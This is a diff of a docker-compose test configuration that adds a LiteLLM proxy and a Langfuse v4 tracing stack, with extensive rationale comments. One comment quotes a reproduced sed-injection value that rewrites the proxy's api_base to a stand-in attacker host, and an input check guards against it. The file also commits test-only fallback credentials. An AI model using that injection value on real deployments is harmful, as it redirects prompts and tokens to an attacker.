@@ -16,8 +16,14 @@
 # Usage (explicit project name keeps its network separate from the main compose project):
 #   docker compose -p am7test -f docker-compose.test.yml up --build
 #   docker compose -p am7test -f docker-compose.test.yml down          # stop; data kept on host
-#   # full reset: stop, then delete the host data dir (there are no NAMED volumes):
+#   # full reset: stop, then delete the host data dir:
 #   docker compose -p am7test -f docker-compose.test.yml down; rm -rf ./docker-data
+#   # ...which covers the DEFAULT stack, where every path is a host bind mount.
+#   # The optional `llmproxy` profile is the ONE exception: langfuse-clickhouse
+#   # and langfuse-minio use NAMED volumes (they commit by atomic rename, which
+#   # fails on a Docker Desktop Windows bind mount). `rm -rf ./docker-data` does
+#   # NOT clear those; add -v:
+#   #   docker compose -p am7test -f docker-compose.test.yml --profile llmproxy down -v
 #   # ...but ANONYMOUS ones do accrue since the pg18 bump: the pg18 base declares
 #   # VOLUME /var/lib/postgresql (the PARENT of our bind), where pg17 declared the
 #   # bind path itself. Each am7-pg container therefore carries one anonymous
@@ -236,10 +242,15 @@ services:
   #   AM7  --(OPENAI_COMPAT, http://litellm:4000/v1/chat/completions)-->  litellm
   #   litellm  --(azure/gpt-5.6-terra)-->  Azure   (+ Langfuse trace callback)
   #
-  # WHY this is reachable from Docker: the upstream is AZURE, a public cloud
-  # endpoint, so the compose network routes to it fine. The "Docker can't reach
-  # the LAN" rule (.claude/rules/troubleshooting.md) only bites LAN hosts like
-  # the SD server at 192.168.1.39 — it does NOT apply to Azure.
+  # REACHABILITY: the compose network reaches BOTH upstreams. Azure is public
+  # cloud, and the LAN Ollama at 192.168.1.42 answers from inside the litellm
+  # container in ~24ms (measured 2026-09-14).
+  #
+  # Do NOT reinstate the old "Docker can't reach the LAN" rule here. It was
+  # retired in .claude/rules/troubleshooting.md on 2026-09-13 and an earlier
+  # revision of THIS comment re-derived it anyway, which is exactly what that
+  # note warns against. If you see packet loss, diagnose it as a host
+  # networking problem -- check from inside the container first.
   #
   # SECRETS: the upstream Azure key is NEVER committed. Provide it at runtime,
   # e.g. an --env-file pointing at a git-ignored volatile path:
@@ -251,55 +262,277 @@ services:
   # front with no manual UI bootstrap.
   # ---------------------------------------------------------------------------
   litellm:
-    image: ghcr.io/berriai/litellm:main-latest
+    # `main-stable` is LiteLLM's released-stable channel (vs `main-latest`,
+    # which is the rolling build). At the time of writing it resolves to
+    # litellm 1.100.1 bundling langfuse PYTHON SDK 2.59.7.
+    #
+    # WATCH THIS ON EVERY BUMP: what the image bundles decides whether tracing
+    # works at all, and the failure mode is silent -- chats keep returning 200
+    # and traces simply never appear (the SDK logs only a generic
+    # "API errors occurred: Bad request").
+    #
+    # The v2 SDK posts to the LEGACY /api/public/ingestion endpoint, and a
+    # stock langfuse:4 REJECTS that -- it runs in `events_only` mode by
+    # default. Hence LANGFUSE_MIGRATION_V4_WRITE_MODE=dual on langfuse-web
+    # below; without it nothing is stored. See the note there.
+    # If a future image ships SDK v3+, switch litellm/config.yaml's
+    # success_callback from "langfuse" to "langfuse_otel" and drop that var.
+    # PINNED BY DIGEST to litellm 1.102.0, and NOT on the `main-stable` channel.
+    # This is a deliberate, measured exception to the "latest stable" preference.
+    #
+    # WHY. `main-stable` is 1.100.1, and in 1.100.1 the per-deployment
+    # max_parallel_requests semaphore is released as soon as the upstream call
+    # returns -- which for a STREAMING request is at the first byte, not at the
+    # end of the stream. AM7 always streams (Chat.java:4034 sets
+    # wireReq.setStream(true) unconditionally, regardless of whether the client
+    # asked for streaming), so on 1.100.1 the cap is INERT for every real AM7
+    # chat. Measured 2026-09-14, cap=1, K=3 concurrent, identical mock upstream:
+    #
+    #        image        stream=false            stream=true
+    #        1.100.1      peak in-flight 1  OK    peak in-flight 3  INERT
+    #        1.102.0      (same)                  peak in-flight 1  OK
+    #
+    #   1.100.1 streaming: 5.05 / 5.08 / 5.08s  (no serialisation at all)
+    #   1.102.0 streaming: 5.90 / 10.92 / 15.93s
+    #
+    # 1.102.0 holds the slot in an AsyncExitStack for the life of the stream.
+    # No `*-stable` tag above 1.100.1 exists, so the fix is only reachable on
+    # the rolling channel -- hence a DIGEST pin rather than `main-latest`, so it
+    # cannot drift silently. Bundles langfuse SDK 2.59.7, identical to stable,
+    # so tracing behaviour is unchanged by this choice.
+    #
+    # ON ANY BUMP: re-run the streaming cap test before trusting the queue, and
+    # re-check the bundled langfuse SDK major (see the note above). Move to a
+    # `*-stable` tag as soon as one ships >= 1.102.
+    image: ghcr.io/berriai/litellm@sha256:a79320760af8df488074ab3fbc830883856c7f952976aad00f039d3a43ffe4b2
     profiles: ["llmproxy"]
     depends_on:
-      langfuse:
-        condition: service_started
-    command: ["--config", "/app/config.yaml", "--port", "4000"]
+      # service_healthy, not service_started: LiteLLM posts trace callbacks to
+      # Langfuse, and a web container that is up but not yet serving drops them.
+      langfuse-web:
+        condition: service_healthy
+      # Needed for the admin UI / key store (DATABASE_URL below). Prisma
+      # migrations run at boot, so the cluster must be accepting connections.
+      am7-pg:
+        condition: service_healthy
+    # The config is a TEMPLATE, rendered at start. litellm's `os.environ/X`
+    # indirection resolves via get_secret() -> a STRING, which is fine for keys
+    # and URLs but breaks any numeric setting: max_parallel_requests then blows
+    # up at REQUEST time with "'<' not supported between instances of 'str' and
+    # 'int'". Measured 2026-09-14 on main-latest (1.102.0); the identical
+    # get_secret()->str path with no int coercion is present in the main-stable
+    # image now pinned above (1.100.1, verified by source inspection in the
+    # running container). So the int is substituted
+    # into the YAML before litellm ever parses it -- the same render-a-template
+    # pattern docker/entrypoint.sh already uses for web.xml.
+    # `$$` escapes compose interpolation so the CONTAINER's shell expands it.
+    entrypoint:
+      - /bin/sh
+      - -c
+      - |
+        # Validate before substituting. The value lands in the REPLACEMENT half
+        # of s|...|VALUE|g, so a `|` in it would close the replacement and the
+        # rest be parsed as sed SCRIPT against the config. REPRODUCED
+        # 2026-09-14 with the value
+        #     1|g;s|os.environ/OLLAMA_API_BASE|http://evil.example/v1
+        # (note: no trailing `|` -- the expression's own `|g` closes it; a
+        # payload that keeps the pipe just errors out). Unvalidated, that
+        # rewrites api_base to the attacker host with sed exiting 0 and litellm
+        # booting normally, so every prompt AND the Bearer token go elsewhere
+        # with nothing in the logs. Verified blocked by the case below.
+        # Today the env file is operator-supplied, so this is defense in depth
+        # -- it becomes a real trust boundary if that value ever comes from CI
+        # or a shared .env. The same guard also stops a
+        # non-numeric value reproducing the str-vs-int request-time crash this
+        # template exists to avoid.
+        #
+        # Assign FIRST, then validate the same variable. An earlier version
+        # tested "$${VAR:-1}" in the case but assigned the RAW "$$VAR" -- so an
+        # UNSET variable matched the `*)` arm (the default made the test see
+        # "1") and then assigned empty, rendering `max_parallel_requests:` as
+        # YAML null and silently disabling the semaphore. That is precisely the
+        # outcome this proxy exists to prevent, arriving via the safety guard.
+        # The -ge 1 check also rejects 0 and 00, which pass a digits-only test
+        # but yield Semaphore(0) -- a deadlock.
+        N="$${LITELLM_LOCAL_MAX_PARALLEL:-1}"
+        case "$$N" in ''|*[!0-9]*) N=1 ;; esac
+        [ "$$N" -ge 1 ] 2>/dev/null || N=1
+        sed "s|__LOCAL_MAX_PARALLEL__|$$N|g" \
+          /app/config.template.yaml > /tmp/litellm.config.yaml
+        echo "[am7] local max_parallel_requests = $$N"
+        exec /app/docker/prod_entrypoint.sh --config /tmp/litellm.config.yaml --port 4000
     ports:
-      # Inspect-only from the host. The app reaches litellm by service name.
-      - "4000:4000"
+      # LOOPBACK-ONLY on purpose. This port fronts LiteLLM's `master_key`,
+      # which is an ADMIN key (/key/generate, spend, model list) and whose
+      # committed fallback is the well-known `sk-am7-litellm-test`. A 0.0.0.0
+      # bind would hand anyone on the LAN that key plus free use of the GPU.
+      # Nothing needs it off-host: the app reaches litellm by service name and
+      # the JUnit tests use http://127.0.0.1:4000.
+      - "127.0.0.1:4000:4000"
     environment:
       # Upstream Azure — key AND base host MUST come from the environment/secret, never committed
       # (supply via --env-file ./volatile/llmproxy.env). No default host in-repo.
       AZURE_API_KEY: ${AZURE_API_KEY:-}
       AZURE_API_BASE: ${AZURE_API_BASE:-}
       AZURE_API_VERSION: ${AZURE_API_VERSION:-2025-04-01-preview}
+      # Upstream LOCAL Ollama on the LAN. MEASURED 2026-09-14 from inside THIS
+      # container: http://192.168.1.42:11434/api/tags -> 200 in 24ms, so the
+      # stale "Docker can't reach the LAN" note does not apply.
+      #
+      # These two MUST be declared here, not merely set in --env-file.
+      # --env-file feeds docker-compose ${VAR} INTERPOLATION only; it does not
+      # put anything in the container. Without these lines litellm's
+      # `os.environ/OLLAMA_API_BASE` resolves to nothing and silently falls back
+      # to localhost:11434 -> "Cannot connect to host localhost:11434".
+      # (Hit on the very first run of this profile, 2026-09-14.)
+      OLLAMA_API_BASE: ${OLLAMA_API_BASE:-http://192.168.1.42:11434}
+      # Concurrency cap for the local model. 1 = strict serialisation.
+      # See src/litellm/config.yaml for why max_parallel_requests is the knob
+      # that QUEUES rather than the one that returns 429.
+      LITELLM_LOCAL_MAX_PARALLEL: ${LITELLM_LOCAL_MAX_PARALLEL:-1}
       # Proxy's own client-facing key (AM7 sends this as its Bearer token).
       LITELLM_MASTER_KEY: ${LITELLM_MASTER_KEY:-sk-am7-litellm-test}
+      # LiteLLM has two halves. The half AM7 uses -- completions, model_list,
+      # the max_parallel_requests queue -- is driven purely by config.yaml +
+      # master_key and needs NO database. The admin UI / virtual keys / spend
+      # tracking half is Postgres-backed, and without this every UI request
+      # 500s with "Not connected to DB!" while the proxy itself stays perfectly
+      # healthy. That was the state until 2026-09-14.
+      #
+      # Its own database in the EXISTING am7-pg cluster, not a schema inside
+      # am72db: LiteLLM runs Prisma migrations and owns its tables outright, so
+      # isolating them keeps it from ever touching the AM7 schema and keeps
+      # `pg_dump am72db` purely AM7.
+      #
+      # The DB is created by docker/postgres/initdb.d/10-litellm-db.sh, which
+      # the postgres entrypoint runs ONLY on a fresh PGDATA. On an
+      # already-provisioned cluster create it once by hand (non-destructive):
+      #   docker exec am7-pg psql -U am7user -d postgres -c "CREATE DATABASE litellmdb"
+      DATABASE_URL: ${LITELLM_DATABASE_URL:-postgresql://am7user:password@am7-pg:5432/litellmdb}
+      # Admin UI login. Without these the UI expects username `admin` with the
+      # master key as the password.
+      UI_USERNAME: ${LITELLM_UI_USERNAME:-admin}
+      UI_PASSWORD: ${LITELLM_UI_PASSWORD:-sk-am7-litellm-test}
       # Tier A callback target.
-      LANGFUSE_HOST: http://langfuse:3000
+      LANGFUSE_HOST: http://langfuse-web:3000
       LANGFUSE_PUBLIC_KEY: ${LANGFUSE_PUBLIC_KEY:-pk-lf-am7-test}
       LANGFUSE_SECRET_KEY: ${LANGFUSE_SECRET_KEY:-sk-lf-am7-test}
     volumes:
-      - ./litellm/config.yaml:/app/config.yaml:ro
+      # Mounted as a TEMPLATE; the entrypoint above renders it to /tmp.
+      - ./litellm/config.yaml:/app/config.template.yaml:ro
     networks:
       - am7-test-net
+    healthcheck:
+      # No curl/wget in this image -- use the bundled python.
+      test: ["CMD", "python", "-c",
+             "import urllib.request,sys; sys.exit(0 if urllib.request.urlopen('http://127.0.0.1:4000/health/liveliness',timeout=4).status==200 else 1)"]
+      interval: 10s
+      timeout: 5s
+      retries: 12
+      start_period: 30s
     restart: unless-stopped
 
-  langfuse:
-    # v2 needs only Postgres (v3 pulls in Clickhouse/Redis/S3 — too heavy for a
-    # test sidecar). Receives traces over the compose network; needs no LAN.
-    image: langfuse/langfuse:2
+  # --- Langfuse v4 (latest stable) -----------------------------------------
+  # v4 is a SIX-service deployment, not the two-service v2 this profile
+  # originally had: web + worker + Postgres + Clickhouse (analytics store) +
+  # Redis (queue) + MinIO (S3 event/media blobs). That weight is the price of
+  # running the supported current release; it is all opt-in behind `llmproxy`
+  # and nothing starts with the default stack.
+  #
+  # NOTE on the SDK -- and CORRECTING an earlier claim in this file: litellm
+  # main-stable (1.100.1) still bundles the langfuse PYTHON SDK v2 (2.59.7),
+  # which writes to the LEGACY /api/public/ingestion endpoint. A stock
+  # langfuse:4 does NOT accept that. v4 defaults to `events_only` mode and
+  # rejects legacy writes outright:
+  #     "Rejected N event(s) from the legacy /api/public/ingestion endpoint
+  #      for project X because this Langfuse v4 deployment runs in events_only
+  #      mode."
+  # and GET /api/public/traces (what every test polls) answers
+  #     "This endpoint is not available on deployments running in Langfuse v4
+  #      events_only mode."
+  # Both strings are in the image; `areLegacyWritesActive()` gates on the write
+  # mode. Measured 2026-09-14 -- an earlier revision of this file asserted the
+  # opposite ("v4 keeps the v2 endpoint, verified"), which was wrong: the
+  # traces observed at the time were landing only because the bridge below had
+  # already been switched on.
+  # LANGFUSE_MIGRATION_V4_WRITE_MODE=dual is therefore REQUIRED for as long as
+  # litellm ships SDK v2. If a future litellm ships SDK v3+, switch the
+  # callback in litellm/config.yaml to "langfuse_otel" and drop that var.
+  langfuse-web:
+    image: docker.langfuse.com/langfuse/langfuse:4
     profiles: ["llmproxy"]
     depends_on:
       langfuse-db:
         condition: service_healthy
+      langfuse-clickhouse:
+        condition: service_healthy
+      langfuse-minio:
+        condition: service_healthy
+      langfuse-redis:
+        condition: service_healthy
     ports:
-      # Langfuse UI on the host (avoids app ports). Login via LANGFUSE_INIT_USER_*.
-      - "3001:3000"
-    environment:
+      # LOOPBACK-ONLY on purpose -- see the note on litellm's port. Traces
+      # hold FULL prompt and completion bodies, and both the UI login and the
+      # pk/sk API keys have committed well-known fallbacks, so a 0.0.0.0 bind
+      # would expose every captured conversation to the LAN.
+      # Login via LANGFUSE_INIT_USER_*.
+      - "127.0.0.1:3001:3000"
+    environment: &langfuse-env
       DATABASE_URL: postgresql://langfuse:langfuse@langfuse-db:5432/langfuse
+      # MEASURED 2026-09-14. A default langfuse:4 deployment runs
+      # in `events_only` mode, in which:
+      #   * the legacy /api/public/ingestion endpoint REJECTS the langfuse
+      #     PYTHON SDK v2 events litellm main-stable sends. langfuse-web logs
+      #     "Rejected 2 event(s) from the legacy /api/public/ingestion endpoint
+      #     ... These events were not stored", and litellm logs only a generic
+      #     "API errors occurred: Bad request" -- so chats keep returning 200 and
+      #     traces silently never appear, exactly the failure mode that note warns about;
+      #   * GET /api/public/traces (what the JUnit tests poll to verify a trace
+      #     landed) answers 
+      #     {"message":"This endpoint is not available on deployments running in
+      #     Langfuse v4 events_only mode"} -- so trace VERIFICATION is impossible too.
+      # `dual` is the migration bridge the server's own error message prescribes and
+      # must be set on BOTH web and worker (it is, via this shared anchor). Verified
+      # live: with it set, a proxied completion carrying x-langfuse-session-id lands a
+      # readable trace whose sessionId equals the header, within ~10s.
+      # The real fix is a litellm image bundling langfuse SDK v3+ (then switch
+      # success_callback to "langfuse_otel" and drop this); until then this stays.
+      LANGFUSE_MIGRATION_V4_WRITE_MODE: ${LANGFUSE_MIGRATION_V4_WRITE_MODE:-dual}
+      SALT: ${LANGFUSE_SALT:-am7-langfuse-salt-test}
+      # v4 REQUIRES this and it must be exactly 64 hex chars (openssl rand -hex 32).
+      # The server refuses to boot otherwise. Test-only value.
+      ENCRYPTION_KEY: ${LANGFUSE_ENCRYPTION_KEY:-0000000000000000000000000000000000000000000000000000000000000000}
+      TELEMETRY_ENABLED: "false"
+      CLICKHOUSE_MIGRATION_URL: clickhouse://langfuse-clickhouse:9000
+      CLICKHOUSE_URL: http://langfuse-clickhouse:8123
+      CLICKHOUSE_USER: clickhouse
+      CLICKHOUSE_PASSWORD: ${LANGFUSE_CLICKHOUSE_PASSWORD:-clickhouse}
+      CLICKHOUSE_CLUSTER_ENABLED: "false"
+      REDIS_HOST: langfuse-redis
+      REDIS_PORT: "6379"
+      REDIS_AUTH: ${LANGFUSE_REDIS_PASSWORD:-langfuse}
+      LANGFUSE_S3_EVENT_UPLOAD_BUCKET: langfuse
+      LANGFUSE_S3_EVENT_UPLOAD_REGION: auto
+      LANGFUSE_S3_EVENT_UPLOAD_ACCESS_KEY_ID: minio
+      LANGFUSE_S3_EVENT_UPLOAD_SECRET_ACCESS_KEY: ${LANGFUSE_MINIO_PASSWORD:-miniosecret}
+      LANGFUSE_S3_EVENT_UPLOAD_ENDPOINT: http://langfuse-minio:9000
+      LANGFUSE_S3_EVENT_UPLOAD_FORCE_PATH_STYLE: "true"
+      LANGFUSE_S3_EVENT_UPLOAD_PREFIX: events/
+      LANGFUSE_S3_MEDIA_UPLOAD_BUCKET: langfuse
+      LANGFUSE_S3_MEDIA_UPLOAD_REGION: auto
+      LANGFUSE_S3_MEDIA_UPLOAD_ACCESS_KEY_ID: minio
+      LANGFUSE_S3_MEDIA_UPLOAD_SECRET_ACCESS_KEY: ${LANGFUSE_MINIO_PASSWORD:-miniosecret}
+      LANGFUSE_S3_MEDIA_UPLOAD_ENDPOINT: http://langfuse-minio:9000
+      LANGFUSE_S3_MEDIA_UPLOAD_FORCE_PATH_STYLE: "true"
+      LANGFUSE_S3_MEDIA_UPLOAD_PREFIX: media/
       NEXTAUTH_URL: http://localhost:3001
       NEXTAUTH_SECRET: ${LANGFUSE_NEXTAUTH_SECRET:-am7-langfuse-nextauth-test}
-      SALT: ${LANGFUSE_SALT:-am7-langfuse-salt-test}
-      TELEMETRY_ENABLED: "false"
+      # Headless bootstrap so LiteLLM is wired up front with no manual UI step.
+      # Deterministic throwaway test keys -- safe to commit, test stack only.
       LANGFUSE_INIT_ORG_ID: am7
       LANGFUSE_INIT_ORG_NAME: AM7
       LANGFUSE_INIT_PROJECT_ID: am7-test
       LANGFUSE_INIT_PROJECT_NAME: AM7 Test
-      # Deterministic keys so LiteLLM (above) is wired up front — test-only, safe to commit.
       LANGFUSE_INIT_PROJECT_PUBLIC_KEY: ${LANGFUSE_PUBLIC_KEY:-pk-lf-am7-test}
       LANGFUSE_INIT_PROJECT_SECRET_KEY: ${LANGFUSE_SECRET_KEY:-sk-lf-am7-test}
       LANGFUSE_INIT_USER_EMAIL: ${LANGFUSE_INIT_USER_EMAIL:-am7@example.com}
@@ -307,15 +540,140 @@ services:
       LANGFUSE_INIT_USER_PASSWORD: ${LANGFUSE_INIT_USER_PASSWORD:-am7-langfuse-pw-test}
     networks:
       - am7-test-net
+    healthcheck:
+      # Required: litellm depends on this with condition: service_healthy, and
+      # a service with no healthcheck can never satisfy that. No curl in this
+      # image -- wget is present.
+      # start_period is generous because first boot runs BOTH the Prisma
+      # (Postgres) and the Clickhouse migrations before it serves anything.
+      # Probe by SERVICE NAME, not localhost and not 127.0.0.1. This is a
+      # Next.js standalone server and it binds to $HOSTNAME -- i.e. the
+      # container's eth0 address only (verified: /proc/net/tcp shows
+      # 172.18.0.x:3000 and nothing on 127.0.0.1 or ::1). Both loopback forms
+      # therefore get "Connection refused" and the container is marked
+      # unhealthy forever while it is in fact serving perfectly on :3001 from
+      # the host. Docker DNS resolves the service name from inside the
+      # container itself, so this probe hits the interface it actually binds.
+      test: ["CMD-SHELL", "wget --no-verbose --tries=1 --spider http://langfuse-web:3000/api/public/health || exit 1"]
+      interval: 10s
+      timeout: 5s
+      retries: 30
+      start_period: 90s
+    restart: unless-stopped
+
+  langfuse-worker:
+    # Ingestion worker. WITHOUT this the API accepts events (202) and the UI
+    # shows NOTHING -- events sit in S3/Redis unprocessed. A missing worker
+    # looks exactly like "tracing is broken".
+    image: docker.langfuse.com/langfuse/langfuse-worker:4
+    profiles: ["llmproxy"]
+    depends_on:
+      langfuse-db:
+        condition: service_healthy
+      langfuse-clickhouse:
+        condition: service_healthy
+      langfuse-minio:
+        condition: service_healthy
+      langfuse-redis:
+        condition: service_healthy
+    environment:
+      <<: *langfuse-env
+    networks:
+      - am7-test-net
+    restart: unless-stopped
+
+  langfuse-clickhouse:
+    # Langfuse v4's analytics store. Traces/observations live HERE, not in
+    # langfuse-db (which holds only metadata: orgs, projects, API keys).
+    image: clickhouse/clickhouse-server:25.12
+    profiles: ["llmproxy"]
+    environment:
+      CLICKHOUSE_DB: default
+      CLICKHOUSE_USER: clickhouse
+      CLICKHOUSE_PASSWORD: ${LANGFUSE_CLICKHOUSE_PASSWORD:-clickhouse}
+    volumes:
+      # NAMED VOLUMES, deliberately breaking this file's bind-everything-to
+      # AM7_DATA_DIR convention. Clickhouse commits parts by atomic rename, and
+      # that fails on a Docker Desktop for Windows bind mount:
+      #   code: 1001 ... filesystem error: in rename: Permission denied
+      #   ["/var/lib/clickhouse/store/.../tmp_insert_all_7_7_0/"]
+      # which crash-loops langfuse-web with the misleading "Applying clickhouse
+      # migrations failed / database is unavailable" message. Measured
+      # 2026-09-14. The upstream Langfuse compose uses named volumes here too.
+      #
+      # Acceptable because this is disposable observability data for a test-only
+      # profile, not AM7 application state -- the durability/inspectability
+      # argument that motivates the bind mounts does not apply.
+      # NOTE: `rm -rf ./docker-data` therefore does NOT clear Langfuse traces.
+      # Use:
+      #   docker compose -p am7test -f docker-compose.test.yml       #     --profile llmproxy down -v
+      - langfuse-clickhouse-data:/var/lib/clickhouse
+      - langfuse-clickhouse-logs:/var/log/clickhouse-server
+    networks:
+      - am7-test-net
+    healthcheck:
+      test: ["CMD-SHELL", "wget --no-verbose --tries=1 --spider http://localhost:8123/ping || exit 1"]
+      interval: 5s
+      timeout: 5s
+      retries: 30
+      start_period: 30s
+    restart: unless-stopped
+
+  langfuse-minio:
+    # S3-compatible blob store for raw ingestion events + media.
+    # cgr.dev/chainguard, NOT docker.io/minio/minio -- the latter now returns
+    # "pull access denied ... repository does not exist" (hit 2026-09-14).
+    # This is the image the upstream Langfuse compose uses.
+    #
+    # PINNED BY DIGEST because Chainguard's free tier publishes only a rolling
+    # `:latest` -- there is no version tag to pin to, and bare `:latest` is the
+    # exact drift this file calls out at the top for PG_IMAGE. Bump
+    # deliberately by re-resolving the digest.
+    image: cgr.dev/chainguard/minio@sha256:ad4a4c0a39ad7b71408124fe3df07b1b2e9d2959a369fac8754d2ef3311b5c20
+    profiles: ["llmproxy"]
+    entrypoint: sh
+    # The bucket must exist before Langfuse writes to it; the stock image does
+    # not create one, so make it here rather than adding a one-shot init service.
+    command: -c "mkdir -p /data/langfuse && minio server --address ':9000' --console-address ':9001' /data"
+    environment:
+      MINIO_ROOT_USER: minio
+      MINIO_ROOT_PASSWORD: ${LANGFUSE_MINIO_PASSWORD:-miniosecret}
+    volumes:
+      # Named volume for the same reason as Clickhouse above (S3 object store
+      # doing rename-based commits on a Windows bind mount).
+      - langfuse-minio-data:/data
+    networks:
+      - am7-test-net
+    healthcheck:
+      test: ["CMD-SHELL", "mc ready local || exit 1"]
+      interval: 5s
+      timeout: 5s
+      retries: 30
+      start_period: 20s
+    restart: unless-stopped
+
+  langfuse-redis:
+    image: redis:7
+    profiles: ["llmproxy"]
+    command: --requirepass ${LANGFUSE_REDIS_PASSWORD:-langfuse}
+    environment:
+      # Only so the healthcheck can authenticate with the same value.
+      REDIS_PASSWORD_FOR_HEALTHCHECK: ${LANGFUSE_REDIS_PASSWORD:-langfuse}
+    networks:
+      - am7-test-net
+    healthcheck:
+      test: ["CMD-SHELL", "redis-cli -a \"$$REDIS_PASSWORD_FOR_HEALTHCHECK\" --no-auth-warning ping"]
+      interval: 5s
+      timeout: 5s
+      retries: 20
     restart: unless-stopped
 
   langfuse-db:
-    # Dedicated Postgres for Langfuse — separate from am7-pg (different app DB).
-    # Version-pinned to stay in step with am7-pg's PG major, but deliberately
-    # NOT given the AM7 tuning: this store is owned by Langfuse, holds trace
-    # data, and has none of the large-complex-query characteristics that tuning
-    # targets. Bumping 17 -> 18 is free here because the `llmproxy` profile has
-    # never been run (no ${AM7_DATA_DIR}/langfuse-pg exists to migrate).
+    # Dedicated Postgres for Langfuse -- separate from am7-pg (different app DB).
+    # Holds only Langfuse METADATA (orgs/projects/API keys); trace data lives in
+    # Clickhouse. Version-pinned to stay in step with am7-pg's PG major, but
+    # deliberately NOT given the AM7 tuning: this store is owned by Langfuse and
+    # has none of the large-complex-query characteristics that tuning targets.
     image: postgres:18.6-trixie
     profiles: ["llmproxy"]
     environment:
@@ -329,7 +687,8 @@ services:
       # this line initdb writes OUTSIDE the bind mount, into the image's
       # anonymous volume: ${AM7_DATA_DIR}/langfuse-pg stays empty, `down`
       # orphans the volume, and the next `up` silently starts an empty Langfuse
-      # DB. No error at any point.
+      # DB. No error at any point. (VERIFIED working on the first real run of
+      # this profile, 2026-09-14: the bind mount populated correctly.)
       PGDATA: /var/lib/postgresql/data
     volumes:
       - ${AM7_DATA_DIR:-./docker-data}/langfuse-pg:/var/lib/postgresql/data
@@ -341,6 +700,15 @@ services:
       timeout: 5s
       retries: 20
     restart: unless-stopped
+
+
+volumes:
+  # Only the `llmproxy` (Langfuse v4) profile uses named volumes; everything
+  # else in this file is bind-mounted under AM7_DATA_DIR on purpose. See the
+  # comments on langfuse-clickhouse for why these two must be the exception.
+  langfuse-clickhouse-data:
+  langfuse-clickhouse-logs:
+  langfuse-minio-data:
 
 networks:
   am7-test-net:
